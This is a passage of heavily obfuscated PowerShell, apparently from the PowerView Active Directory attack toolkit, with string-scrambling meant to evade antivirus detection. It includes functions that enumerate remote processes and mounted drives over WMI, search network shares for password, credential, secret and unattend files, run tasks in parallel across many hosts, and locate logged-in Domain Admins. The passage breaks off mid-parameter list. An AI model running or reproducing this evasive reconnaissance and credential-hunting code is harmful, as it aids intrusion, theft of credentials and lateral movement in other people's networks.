                                ${Moun`TeD`driVe} | &("{1}{0}{2}" -f'dd','A','-Member') ("{0}{1}{2}" -f'Note','pro','perty') ("{3}{0}{2}{1}"-f'om','Name','puter','C') ${cO`MPuTer}
                                ${mou`NtE`Dd`RI`VE} | &("{2}{1}{0}"-f 'ember','M','Add-') ("{3}{1}{2}{0}" -f'eproperty','o','t','N') ("{1}{0}" -f 'e','UserNam') ${uSeR`N`AMe}
                                ${mo`UNTEDD`R`iVe} | &("{0}{2}{1}"-f'A','ber','dd-Mem') ("{0}{2}{1}"-f'N','perty','otepro') ("{0}{1}" -f 'Us','erSID') ${U`sE`RSId}
                                ${mO`UNt`Ed`DRIVe} | &("{0}{1}{2}" -f 'Add-M','em','ber') ("{3}{2}{0}{1}" -f 't','y','oper','Notepr') ("{2}{1}{0}"-f'r','riveLette','D') ${DR`IV`ELeTter}
                                ${MO`UN`TeDDriVE} | &("{0}{2}{1}" -f'Add-','r','Membe') ("{0}{1}{2}"-f'Notepr','op','erty') ("{1}{2}{3}{0}"-f 'erName','Pr','ovi','d') ${PRoV`idERNA`mE}
                                ${MounTeD`d`Ri`Ve} | &("{0}{2}{1}"-f'Add-Mem','er','b') ("{2}{1}{0}"-f'y','rt','Noteprope') ("{0}{2}{1}"-f'Remote','ath','P') ${R`EM`Ot`epath}
                                ${M`ounT`eD`dRIVE} | &("{2}{0}{1}"-f'dd','-Member','A') ("{2}{1}{0}"-f 'erty','p','Notepro') ("{3}{4}{2}{0}{1}"-f'am','e','eUserN','Dri','v') ${DRI`VeUSeR`N`A`Me}
                                ${mO`UNte`ddRi`VE}."PS`o`BJect"."t`YPEnA`MEs".("{1}{0}"-f'nsert','I').Invoke(0, ("{6}{4}{1}{5}{2}{3}{0}"-f 'untedDrive','w','R','egMo','erVie','.','Pow'))
                                ${M`OunTeDD`RI`Ve}
                            }
                        }
                    }
                    catch {
                        &("{3}{0}{1}{2}"-f'e-V','erb','ose','Writ') ('[G'+'et'+'-'+'WMI'+'RegMo'+'untedDrive] '+'Err'+'o'+'r: '+"$_")
                    }
                }
            }
            catch {
                &("{0}{1}{2}{3}"-f 'Wri','te-Warn','in','g') ('[G'+'et-WMIReg'+'Mount'+'ed'+'Dr'+'ive] '+'Err'+'or'+' '+'a'+'c'+'c'+'essing '+"$Computer, "+'li'+'kely'+' '+'insuffi'+'ci'+'e'+'nt '+'permi'+'ss'+'ions '+'o'+'r '+'f'+'irew'+'all '+'r'+'ules'+' '+'o'+'n '+'host:'+' '+"$_")
            }
        }
    }
}


function gE`T-wMIpR`Oce`Ss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{1}{2}"-f'S','ouldProc','ess','PS','h'}, '')]
    [OutputType({"{5}{4}{3}{1}{0}{2}"-f'ro','P','cess','User','.','PowerView'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTion = 0, valuEfrompipelINE = ${TR`UE}, VAluefrompIPelineByPROPertYNAME = ${t`Rue})]
        [Alias({"{2}{0}{1}" -f'ostN','ame','H'}, {"{0}{1}{2}"-f'dnshost','n','ame'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oMP`U`TErn`AmE} = ("{1}{2}{3}{0}"-f't','l','ocalh','os'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REd`eN`TIaL} =  (&("{1}{0}{2}"-f'ri','Va','aBLe') ('j'+'H3xO'+'6'))."VaL`UE"::"Em`PtY"
    )

    PROCESS {
        ForEach (${CO`mPuT`Er} in ${comPuT`e`RnAMe}) {
            try {
                ${wM`I`Ar`GuM`entS} = @{
                    ("{2}{0}{3}{1}" -f 'mp','erName','Co','ut') = ${CoMpu`TE`Rname}
                    ("{1}{0}"-f's','Clas') = ("{1}{0}{2}" -f'2_pr','Win3','ocess')
                }
                if (${psBouNd`Pa`R`AmeTErs}[("{0}{1}{2}" -f 'Credent','i','al')]) { ${W`MIaRgUMe`NtS}[("{2}{3}{0}{1}" -f 'dent','ial','C','re')] = ${cR`ED`eNTIal} }
                &("{3}{1}{0}{4}{2}"-f'-WM','et','ct','G','Iobje') @WmiArguments | &("{1}{2}{0}"-f 'ect','ForEach-O','bj') {
                    ${O`Wn`ER} = ${_}.("{2}{0}{1}"-f 'wne','r','geto').Invoke();
                    ${pr`OC`EsS} = &("{3}{0}{1}{2}"-f'-Obj','e','ct','New') ("{2}{0}{1}"-f 'Ob','ject','PS')
                    ${pro`CESs} | &("{2}{0}{1}"-f 'Membe','r','Add-') ("{0}{2}{1}{3}" -f'Note','opert','pr','y') ("{1}{2}{0}" -f'me','Compute','rNa') ${cOm`p`UT`eR}
                    ${pr`Oc`eSS} | &("{2}{1}{0}"-f 'ber','em','Add-M') ("{2}{0}{1}" -f 'ert','y','Noteprop') ("{2}{1}{0}" -f 'ssName','e','Proc') ${_}."pRoCE`ss`NamE"
                    ${prOc`EsS} | &("{1}{3}{0}{2}" -f'-Membe','A','r','dd') ("{3}{0}{2}{1}"-f 'epr','ty','oper','Not') ("{0}{2}{1}" -f 'Proce','ID','ss') ${_}."P`R`OCes`Sid"
                    ${prOC`E`sS} | &("{0}{1}{2}" -f 'Add-','Memb','er') ("{0}{1}{2}" -f'N','otepr','operty') ("{2}{1}{0}"-f 'in','a','Dom') ${OW`N`er}."dO`mAin"
                    ${p`ROCE`sS} | &("{2}{0}{1}"-f 'dd-Memb','er','A') ("{2}{0}{1}{3}"-f 'eprop','e','Not','rty') ("{0}{1}" -f 'Us','er') ${O`W`NeR}."Us`er"
                    ${P`RoC`ESS}."ps`ob`Ject"."ty`pEnAMeS".("{1}{0}"-f 't','Inser').Invoke(0, ("{0}{2}{1}{3}{4}" -f 'PowerVie','roc','w.UserP','es','s'))
                    ${pr`OC`eSS}
                }
            }
            catch {
                &("{0}{2}{3}{1}" -f 'Write-','ose','V','erb') ('['+'Ge'+'t-WMIProcess]'+' '+'Err'+'or '+'enu'+'m'+'erati'+'ng '+'remote'+' '+'pro'+'cess'+'es '+'on'+' '+"'$Computer', "+'acc'+'ess '+'likely'+' '+'d'+'enied: '+"$_")
            }
        }
    }
}


function FIND-`IN`Te`RE`STiNGFILe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f'ess','l','dProc','PSShou'}, '')]
    [OutputType({"{3}{1}{0}{2}" -f'Fou','.','ndFile','PowerView'})]
    [CmdletBinding(DEfaULTpArameterseTname = {"{3}{1}{2}{0}" -f 'ication','le','Specif','Fi'})]
    Param(
        [Parameter(posiTIoN = 0, VAlUEfRoMPiPelInE = ${TR`UE}, valuEFroMPipelineBYProPErTyNAme = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`AtH} = '.\',

        [Parameter(pAramEtERSETNamE = "fil`esPEcI`Fi`CaTion")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}" -f 'hTe','rms','arc','Se'}, {"{1}{0}" -f 'rms','Te'})]
        [String[]]
        ${INc`L`UDE} = @(("{0}{1}{2}"-f '*passw','o','rd*'), ("{0}{1}{3}{2}"-f '*se','nsi','ve*','ti'), ("{1}{2}{0}" -f'n*','*a','dmi'), ("{1}{0}"-f 'gin*','*lo'), ("{0}{1}{2}"-f '*s','ec','ret*'), ("{0}{1}{2}" -f 'unatt','end*','.xml'), ("{0}{1}"-f '*.vm','dk'), ("{0}{1}"-f'*cre','ds*'), ("{3}{1}{0}{2}"-f 'denti','re','al*','*c'), ("{0}{1}{2}"-f '*.','confi','g')),

        [Parameter(pARAmeTersetname = "fILESpEc`IFI`cA`TiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`AsTaCc`ESSt`i`Me},

        [Parameter(pArAmeTersETnaMe = "FiLEsP`E`cI`FiC`AT`IOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${L`ASTwRiteT`I`mE},

        [Parameter(PAramETerSETnAmE = "filES`PecI`Fi`cATIoN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CreAt`i`ONtIME},

        [Parameter(ParameTErsEtnaME = "ofF`icED`OCS")]
        [Switch]
        ${o`FFi`CEd`OCs},

        [Parameter(PaRAmETErSetName = "f`Re`SHeX`es")]
        [Switch]
        ${freS`He`x`ES},

        [Parameter(pArametERsetnAMe = "F`iLe`SpEcifiCA`TIoN")]
        [Switch]
        ${eXC`LUdE`F`Ol`dErs},

        [Parameter(paRAMeterSetname = "fiLe`S`PE`ciFicaT`ioN")]
        [Switch]
        ${E`X`cLud`ehIddeN},

        [Switch]
        ${cHeCKwrIt`EaC`C`e`SS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`d`eNTi`Al} =  ( &('lS')  ("{3}{0}{1}{4}{2}" -f 'IAble:j','h3','o6','vAR','x') )."V`ALuE"::"E`mPty"
    )

    BEGIN {
        ${SeArChe`RA`RG`Ume`Nts} =  @{
            ("{0}{2}{1}"-f'R','urse','ec') = ${T`RUE}
            ("{3}{0}{1}{2}" -f'r','rorActio','n','E') = ("{1}{3}{0}{2}" -f 'l','S','entlyContinue','i')
            ("{1}{0}"-f 'lude','Inc') = ${i`NClu`dE}
        }
        if (${PSB`oU`NDPar`A`me`TErs}[("{1}{0}{3}{2}" -f'ce','Offi','s','Doc')]) {
            ${sEa`RChE`R`A`RguMents}[("{0}{1}{2}" -f'Incl','u','de')] = @(("{1}{0}"-f'c','*.do'), ("{0}{1}"-f '*.d','ocx'), ("{1}{0}" -f 'ls','*.x'), ("{1}{0}" -f '.xlsx','*'), ("{0}{1}" -f '*','.ppt'), ("{2}{1}{0}" -f'ptx','p','*.'))
        }
        elseif (${p`Sb`ouN`dpar`AmETErS}[("{0}{1}"-f 'Fre','shEXEs')]) {
            
            ${LAs`TaCCEss`T`Ime} = (&("{2}{0}{1}" -f'a','te','Get-D')).("{1}{0}{2}"-f'd','A','dDays').Invoke(-7).("{1}{2}{0}"-f'ring','T','oSt').Invoke(("{3}{0}{1}{2}" -f 'M/dd','/y','yyy','M'))
            ${SeA`R`ChErArGumeN`TS}[("{0}{2}{1}" -f 'In','e','clud')] = @(("{1}{0}"-f 'xe','*.e'))
        }
        ${SeAR`cH`Era`RgUmeNts}[("{1}{0}" -f'rce','Fo')] = -not ${ps`Bo`UnDP`AraMet`ERS}[("{0}{3}{2}{1}"-f'Exclude','en','idd','H')]

        ${mapPedC`O`mp`U`TErS} = @{}

        function TeSt-`w`RITe {
            
            [CmdletBinding()]Param([String]${pA`Th})
            try {
                ${fi`l`eTEsT} =   (  &("{1}{2}{0}"-f'riablE','ge','t-va')  ("{0}{1}"-f'OH','g40') -vALuEoNlY)::("{2}{1}{0}" -f'enWrite','p','O').Invoke(${Pa`Th})
                ${fil`et`est}.("{1}{0}" -f'e','Clos').Invoke()
                ${TR`Ue}
            }
            catch {
                ${FAl`SE}
            }
        }
    }

    PROCESS {
        ForEach (${TA`RG`et`PAtH} in ${p`ATH}) {
            if ((${T`A`RGeTpatH} -Match ((("{3}{1}{0}{5}{4}{2}" -f 'h4uh.*','4u','uh.*','4uh4uh','4','4uh')) -rePlACe'4uh',[chAR]92)) -and (${P`sbo`UNDpaR`AmetErs}[("{0}{2}{1}" -f 'Cre','ential','d')])) {
                ${HO`st`cO`mpuTeR} = (&("{0}{1}{2}"-f'Ne','w-Ob','ject') ("{1}{0}{2}"-f 'r','System.U','i')(${Ta`RgeT`pATH}))."HO`St"
                if (-not ${m`Ap`pEDCo`MPUTe`RS}[${HOSTCoMP`Ut`eR}]) {
                    
                    &("{4}{5}{2}{0}{1}{6}{3}"-f 'n','n','moteCo','n','Add','-Re','ectio') -ComputerName ${HOStCO`M`pUTEr} -Credential ${C`ReDen`TiaL}
                    ${MA`PPeDc`oMp`U`TerS}[${ho`stComp`UTER}] = ${tR`Ue}
                }
            }

            ${SeaRch`e`RAR`GumENtS}[("{0}{1}"-f 'Pat','h')] = ${taRG`eTpA`TH}
            &("{3}{1}{0}{2}" -f 'd','il','Item','Get-Ch') @SearcherArguments | &("{0}{3}{1}{2}" -f 'F','rEach-Obj','ect','o') {
                
                ${c`oNt`InUe} = ${t`RUe}
                if (${PsBO`UnDPa`Rame`TerS}[("{2}{0}{1}{3}" -f'o','lde','ExcludeF','rs')] -and (${_}."Ps`iScoN`TaI`N`er")) {
                    &("{1}{3}{0}{2}" -f'ite-Ver','W','bose','r') "Excluding: $($_.FullName) "
                    ${c`o`NTinue} = ${FA`L`SE}
                }
                if (${l`AsTAC`Ce`ss`TimE} -and (${_}."lA`sTa`cC`Esst`ime" -lt ${laSta`c`ceSSt`iMe})) {
                    ${CO`Nti`NuE} = ${fA`L`sE}
                }
                if (${psbOUN`d`Pa`RamEtERs}[("{3}{1}{2}{0}" -f 'e','Ti','m','LastWrite')] -and (${_}."l`ASt`w`RItETiMe" -lt ${Las`TWr`ITe`T`Ime})) {
                    ${CoN`Tin`UE} = ${F`A`LsE}
                }
                if (${Psb`OUn`dpaRaM`e`TerS}[("{0}{1}{3}{2}" -f'Creati','o','e','nTim')] -and (${_}."Creat`iOnt`ImE" -lt ${Cr`eA`T`IOntIMe})) {
                    ${con`T`In`Ue} = ${FA`L`SE}
                }
                if (${PSBoU`NDp`ARamETe`RS}[("{1}{2}{0}{3}" -f'teAcc','C','heckWri','ess')] -and (-not (&("{0}{1}{2}" -f 'T','est-Wr','ite') -Path ${_}."fu`Llna`me"))) {
                    ${C`oNtI`Nue} = ${f`Alse}
                }
                if (${C`o`NtI`NuE}) {
                    ${FilEP`A`RaMS} = @{
                        ("{0}{1}"-f'Pa','th') = ${_}."FU`L`LNamE"
                        ("{0}{1}" -f'O','wner') = $((&("{1}{0}{2}"-f'A','Get-','cl') ${_}."fu`LlnA`mE")."OWN`ER")
                        ("{2}{1}{0}" -f'cessTime','astAc','L') = ${_}."La`STaC`ceSstI`me"
                        ("{2}{1}{0}{3}"-f 'eT','rit','LastW','ime') = ${_}."LAsT`wR`i`TeTI`mE"
                        ("{2}{3}{1}{0}"-f 'nTime','io','C','reat') = ${_}."CR`eAT`I`onTiMe"
                        ("{0}{1}"-f 'L','ength') = ${_}."LE`Ng`TH"
                    }
                    ${FOUN`dfi`lE} = &("{0}{1}{2}" -f 'N','ew-O','bject') -TypeName ("{2}{1}{0}" -f 'ect','Obj','PS') -Property ${FI`Le`p`ArAmS}
                    ${f`O`Un`dfILe}."p`SobJeCT"."TYp`En`AmeS".("{0}{1}" -f'In','sert').Invoke(0, ("{2}{0}{3}{1}" -f 'rView.Fo','File','Powe','und'))
                    ${fOUN`Df`iLE}
                }
            }
        }
    }

    END {
        
        ${mapp`E`dcO`M`pUters}."ke`yS" | &("{4}{3}{1}{0}{2}"-f 'io','moteConnect','n','ve-Re','Remo')
    }
}








function neW-thrEaDed`Fu`N`Ction {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{2}{1}{11}{7}{0}{6}{3}{4}{8}{10}{9}"-f 'St','ul','ho','ng','i','PSUseS','ateCha','cessFor','ngFunct','ns','io','dPro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItIon = 0, MAndaToRy = ${T`RuE}, VALuefrompIPeLInE = ${tr`Ue}, VAlUeFRoMpipElinEBYprOpeRTynAME = ${t`RUE})]
        [String[]]
        ${COmpU`TernA`mE},

        [Parameter(posITION = 1, manDAToRY = ${TR`UE})]
        [System.Management.Automation.ScriptBlock]
        ${SCR`I`pTb`loCK},

        [Parameter(pOsiTion = 2)]
        [Hashtable]
        ${sCriPTPa`Ra`ME`Ters},

        [Int]
        [ValidateRange(1,  100)]
        ${thR`E`Ads} = 20,

        [Switch]
        ${NoImP`OR`TS}
    )

    BEGIN {
        
        
        ${SeSSIO`Nst`A`TE} =   (&("{2}{1}{0}{3}" -f 'a','T-vaRi','GE','blE') ("e"+"Q1bR") -VAL  )::("{2}{1}{0}" -f'ault','Def','Create').Invoke()

        
        
        ${SeS`SioNST`A`TE}."aP`A`RtMEnt`STA`Te" =   ${q8`j3}::"S`Ta"

        
        
        if (-not ${NOi`M`poRts}) {
            
            ${m`YV`ArS} = &("{1}{0}{2}"-f '-V','Get','ariable') -Scope 2

            
            ${v`oRbID`deNv`ArS} = @('?',("{0}{1}" -f 'arg','s'),("{3}{4}{2}{1}{0}" -f 'e','m','eNa','Console','Fil'),("{0}{1}"-f'Err','or'),("{1}{0}{2}{3}"-f'o','Executi','nCon','text'),("{1}{0}"-f 'e','fals'),("{0}{1}" -f'H','OME'),("{0}{1}"-f 'Ho','st'),("{0}{1}"-f 'inp','ut'),("{2}{1}{0}" -f'ect','utObj','Inp'),("{1}{2}{3}{0}"-f 't','MaximumAl','iasCou','n'),("{2}{4}{1}{3}{0}"-f 'nt','veCo','Maxim','u','umDri'),("{0}{1}{4}{3}{2}" -f'Maximum','Error','t','oun','C'),("{0}{2}{1}{4}{3}" -f 'MaximumFu','C','nction','t','oun'),("{4}{1}{0}{3}{2}" -f 'tory','aximumHis','t','Coun','M'),("{3}{1}{2}{0}" -f 't','aximumVariab','leCoun','M'),("{1}{2}{0}{3}"-f 'tio','MyInv','oca','n'),("{1}{0}"-f'l','nul'),'PID',("{2}{1}{5}{4}{0}{3}"-f'aramet','S','P','ers','undP','Bo'),("{2}{0}{1}" -f'ma','ndPath','PSCom'),("{0}{2}{1}"-f'P','ure','SCult'),("{4}{3}{5}{0}{1}{6}{2}" -f 'ramet','e','Values','ltP','PSDefau','a','r'),("{1}{0}"-f'ME','PSHO'),("{1}{0}{2}"-f'ScriptRoo','PS','t'),("{1}{2}{0}"-f 'lture','PSUI','Cu'),("{1}{2}{0}{3}"-f'ab','PSVers','ionT','le'),'PWD',("{1}{0}{2}"-f'I','Shell','d'),("{3}{4}{2}{0}{1}" -f'ni','zedHash','o','Synch','r'),("{0}{1}" -f'tr','ue'))

            
            ForEach (${V`Ar} in ${M`YvA`RS}) {
                if (${vOrbI`DDen`V`ARs} -NotContains ${V`AR}."N`AME") {
                ${SEss`iO`N`STate}."v`ArIableS".("{0}{1}" -f 'A','dd').Invoke((&("{2}{0}{1}" -f'ec','t','New-Obj') -TypeName ("{10}{2}{6}{0}{8}{3}{5}{1}{7}{9}{4}" -f 'io','teVariable','tem.Man','S','ry','essionSta','agement.Automat','E','n.Runspaces.','nt','Sys') -ArgumentList ${v`Ar}."n`AmE",${v`AR}."val`Ue",${v`AR}."de`scR`IPt`ion",${v`Ar}."O`p`TIoNs",${v`AR}."A`T`TRiBUT`ES"))
                }
            }

            
            ForEach (${fUn`ct`iON} in (&("{0}{3}{2}{1}"-f 'G','ChildItem','-','et') ("{0}{1}"-f 'Fu','nction:'))) {
                ${SesSIon`S`TATE}."cO`mman`dS".("{1}{0}"-f'dd','A').Invoke((&("{0}{2}{1}"-f 'Ne','-Object','w') -TypeName ("{10}{3}{4}{1}{14}{7}{0}{11}{2}{15}{5}{13}{9}{16}{8}{6}{12}"-f'.A','anag','at','st','em.M','es.SessionSta','ntr','ent','ionE','e','Sy','utom','y','t','em','ion.Runspac','Funct') -ArgumentList ${fU`NCT`ION}."Na`ME", ${fu`NcT`IoN}."d`EfIni`Ti`oN"))
            }
        }

        
        
        

        
        ${po`Ol} =  (  &("{2}{1}{0}" -f'ABle','i','VAr') ("{2}{0}{1}" -f 'a','SE','CUX')  -vALuEoN)::("{1}{5}{2}{0}{4}{3}" -f 'nspace','C','eateRu','ol','Po','r').Invoke(1, ${TH`R`eaDs}, ${SESSIO`N`State}, ${h`OSt})
        ${p`oOL}.("{1}{0}" -f'n','Ope').Invoke()

        
        ${MEtH`OD} = ${NU`Ll}
        ForEach (${m} in   ${a`6M}.("{1}{0}{2}" -f 'etM','G','ethods').Invoke() | &("{1}{0}{2}" -f'ere-Ob','Wh','ject') { ${_}."Na`Me" -eq ("{0}{2}{1}" -f 'B','e','eginInvok') }) {
            ${mET`h`odP`Ar`AmeT`eRs} = ${m}.("{2}{0}{1}" -f 'tPar','ameters','Ge').Invoke()
            if ((${M`ET`h`OdParaMeTERs}."CO`UNT" -eq 2) -and ${Me`T`HoDpaRAm`eT`eRs}[0]."N`AME" -eq ("{0}{1}" -f 'inp','ut') -and ${Me`THO`Dp`ARaMet`eRS}[1]."nA`me" -eq ("{1}{0}{2}" -f'tpu','ou','t')) {
                ${METh`Od} = ${M}."ma`KeG`ENeRi`cM`EThOd"([Object], [Object])
                break
            }
        }

        ${J`oBs} = @()
        ${c`OmPU`T`ERNAme} = ${coM`P`UTErNAME} | &("{0}{2}{1}{3}" -f 'W','-Ob','here','ject') {${_} -and ${_}.("{1}{0}" -f 'm','Tri').Invoke()}
        &("{1}{4}{3}{2}{0}"-f 'e','Wr','rbos','Ve','ite-') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${Thr`E`ADS} -ge ${ComP`UtE`R`NAME}."L`eNgTH") {
            ${tHR`e`Ads} = ${cOmPuT`e`RnaME}."leN`G`Th"
        }
        ${eleMENts`p`lI`TSiZE} = [Int](${cOm`pUt`ernA`mE}."LeN`g`TH"/${tHRe`AdS})
        ${COMpUt`Er`N`AmepARtIt`i`ONed} = @()
        ${St`ArT} = 0
        ${E`ND} = ${E`LEM`ENTsplI`Ts`IZe}

        for(${i} = 1; ${I} -le ${ThR`EADs}; ${I}++) {
            ${LI`sT} = &("{1}{0}{2}"-f'Ob','New-','ject') ("{3}{0}{6}{2}{1}{7}{8}{5}{4}"-f't','.A','ns','Sys','t','yLis','em.Collectio','rr','a')
            if (${i} -eq ${ThreA`DS}) {
                ${e`Nd} = ${C`oM`PUterN`Ame}."L`en`gTh"
            }
            ${l`iSt}."A`Dd`RANGe"(${com`puTE`RNa`mE}[${S`T`ARt}..(${E`ND}-1)])
            ${St`ArT} += ${E`le`MEnt`sP`liTsiZe}
            ${e`ND} += ${eL`E`meNtsP`L`ItSIze}
            ${coMp`UT`e`RNaM`epaRtIT`IO`N`ED} += @(,@(${Li`st}.("{0}{1}{2}"-f 'T','oArr','ay').Invoke()))
        }

        &("{0}{1}{2}" -f 'W','rite-V','erbose') ('[N'+'ew'+'-Thr'+'e'+'adedFunction] '+'To'+'tal'+' '+'nu'+'mber '+'o'+'f '+'th'+'r'+'eads/partit'+'ions: '+"$Threads")

        ForEach (${coMpUTeRn`A`MEP`ArTI`TioN} in ${cO`m`p`UTE`RNAMepaR`TITIo`NEd}) {
            
            ${Po`w`ERShe`LL} =  (&("{1}{0}{2}"-f'T-','gE','itEM')  ("{1}{2}{0}"-f':A6m','VAria','ble'))."V`ALUe"::("{1}{2}{0}" -f'te','Cre','a').Invoke()
            ${poW`ERS`Hell}."R`UN`sPacE`poOl" = ${p`oOl}

            
            ${n`UlL} = ${PoW`e`RshElL}.("{0}{1}{2}" -f 'A','ddScr','ipt').Invoke(${ScR`ip`TBLock}).("{2}{1}{0}{3}"-f 'ame','ddPar','A','ter').Invoke(("{0}{1}{2}"-f 'Comp','ut','erName'), ${C`ompUTErn`AM`Ep`ARTiTION})
            if (${SCrip`T`pA`R`AmETErs}) {
                ForEach (${pA`RAm} in ${scrIpT`paRAM`eT`eRS}.("{1}{0}{3}{2}" -f 'mer','GetEnu','or','at').Invoke()) {
                    ${NU`Ll} = ${P`OwersH`ell}.("{2}{1}{0}" -f 'r','te','AddParame').Invoke(${pAR`Am}."n`AmE", ${PaR`Am}."val`UE")
                }
            }

            
            ${o`UTp`Ut} = &("{1}{3}{2}{0}" -f 'Object','Ne','-','w') ("{12}{7}{1}{11}{9}{8}{2}{10}{4}{3}{0}{6}{5}"-f 'on[O','age','SDa','cti','lle',']','bject','an','n.P','Automatio','taCo','ment.','M')

            
            ${jo`BS} += @{
                ('PS') = ${PO`wErShe`Ll}
                ("{0}{1}" -f 'Outp','ut') = ${o`UtpuT}
                ("{1}{0}"-f 'lt','Resu') = ${M`EThod}."iNVo`ke"(${pOW`e`RS`heLl}, @(${nu`Ll}, [Management.Automation.PSDataCollection[Object]]${o`UT`PuT}))
            }
        }
    }

    END {
        &("{4}{3}{1}{2}{0}" -f'rbose','-V','e','rite','W') ("{7}{4}{0}{3}{9}{8}{10}{2}{6}{11}{5}{1}"-f 'ew-T','g','ti','h','N',' executin','on','[','d','rea','edFunc','] Threads')

        
        Do {
            ForEach (${J`Ob} in ${j`obS}) {
                ${J`Ob}."ou`Tput".("{1}{2}{0}"-f'l','ReadA','l').Invoke()
            }
            &("{3}{1}{0}{2}" -f'l','rt-S','eep','Sta') -Seconds 1
        }
        While ((${j`oBS} | &("{0}{1}{3}{2}"-f 'W','he','t','re-Objec') { -not ${_}."REs`Ult"."i`Sc`OMP`LETeD" })."cOU`Nt" -gt 0)

        ${SLeep`SEc`ONDs} = 100
        &("{1}{0}{4}{2}{3}"-f 'e-','Writ','e','rbose','V') ('[New-'+'T'+'hrea'+'dedF'+'unction'+'] '+'Wai'+'ti'+'ng '+"$SleepSeconds "+'se'+'conds'+' '+'fo'+'r '+'fi'+'n'+'al '+'cle'+'anu'+'p'+'...')

        
        for (${i}=0; ${I} -lt ${Sle`EpsEC`ONDS}; ${i}++) {
            ForEach (${j`Ob} in ${jo`BS}) {
                ${J`oB}."oUt`PuT".("{2}{0}{1}" -f'eadAl','l','R').Invoke()
                ${j`Ob}."P`s".("{1}{0}"-f'e','Dispos').Invoke()
            }
            &("{3}{1}{2}{0}" -f 'ep','t','-Sle','Star') -S 1
        }

        ${p`oOl}.("{1}{0}" -f 'se','Dispo').Invoke()
        &("{1}{0}{3}{2}"-f'te-V','Wri','rbose','e') ("{2}{7}{0}{5}{3}{6}{1}{4}" -f 'nct','t','[New-Threaded','s com','ed','ion] all thread','ple','Fu')
    }
}


function F`i`Nd-`dO`maiN`UsERLoC`ATiON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}"-f 'rocess','PS','uldP','Sho'}, '')]
    [OutputType({"{1}{3}{0}{2}" -f 'serL','PowerVie','ocation','w.U'})]
    [CmdletBinding(DEFAultpAraMeTeRsetNamE = {"{0}{1}{2}{3}"-f'U','se','rG','roupIdentity'})]
    Param(
        [Parameter(PoSiTIon = 0, VALueFRoMpIpELIne = ${TR`UE}, VAluEfrOMPIpelInEByPROPERTYnAME = ${t`RuE})]
        [Alias({"{3}{0}{1}{2}"-f 'Ho','s','tName','DNS'})]
        [String[]]
        ${Com`PU`TeRnamE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COM`p`UtErDO`m`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMPUT`eRL`Da`pFiLTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`M`PuTE`RSEa`RC`hbAse},

        [Alias({"{0}{4}{3}{2}{1}"-f 'Unco','ed','in','stra','n'})]
        [Switch]
        ${cO`mP`U`TERUNcoNSt`RAiNEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}"-f 'm','rating','Ope','Syste'})]
        [String]
        ${compUT`ErOP`EraTI`NG`s`Y`St`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}"-f'i','cePac','k','Serv'})]
        [String]
        ${c`o`MputeR`sEr`VI`CEP`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'ame','Sit','eN'})]
        [String]
        ${CompuTer`s`itENA`Me},

        [Parameter(pArameTersETnAME = "u`SerIDe`NtitY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uS`ER`Id`eNTItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`SeRdOma`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USerl`DaPfil`T`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`eRseAr`CHBAse},

        [Parameter(paRAmetERsETNaME = "uSe`RG`R`o`UpidEntitY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}"-f'Na','up','Gro','me'}, {"{0}{1}" -f 'Gro','up'})]
        [String[]]
        ${u`SeR`GRoUpI`D`EnTITY} = ("{0}{2}{3}{1}{4}" -f'Domai','n','n Adm','i','s'),

        [Alias({"{1}{2}{0}"-f'unt','Admi','nCo'})]
        [Switch]
        ${use`RaDM`INcoUnT},

        [Alias({"{3}{2}{1}{0}{4}"-f'i','elegat','wD','Allo','on'})]
        [Switch]
        ${UsERAl`l`o`Wdele`gATi`on},

        [Switch]
        ${ChE`CK`ACcEsS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{4}{3}{2}" -f 'm','Do','er','Controll','ain'})]
        [String]
        ${S`erVer},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{0}" -f'eLevel','On'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${se`A`Rchsco`pe} = ("{0}{1}"-f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eS`U`lt`pAGEsIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VerT`ImEL`im`It},

        [Switch]
        ${tO`mB`STO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDe`N`Ti`Al} =   (  &("{1}{0}{2}" -f'-it','GET','em')  ("{3}{1}{2}{0}" -f '6','bLe:J','H3XO','VAria') )."v`Alue"::"EMP`TY",

        [Switch]
        ${StOp`oN`Suc`Cess},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`EL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`iTTER} = .3,

        [Parameter(PArAMEteRseTname = "s`HowaLL")]
        [Switch]
        ${S`h`oWAlL},

